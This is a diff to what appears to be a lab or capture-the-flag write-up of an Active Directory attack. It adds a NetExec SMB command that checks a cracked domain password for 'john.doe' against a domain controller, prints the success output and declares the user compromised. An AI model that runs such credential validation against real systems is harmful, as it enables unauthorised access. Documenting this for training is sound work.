@@ -313,6 +313,17 @@ JOHN.DOE::NOVAFORGE:fec2858bc2db6aec:e88119bedf0bd2659d55a94768ac1fbb:0101000000
 The hash cracked
 
 ```python
+nxc smb dc.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5                           
+SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.0.100      445    DC               [+] novaforge.local\john.doe:johndoe1369
+```
+
+This user is now compromised!
+
+# Enumeration as `john.doe`
+
+## SMB shares
+```python
 
 ```
 
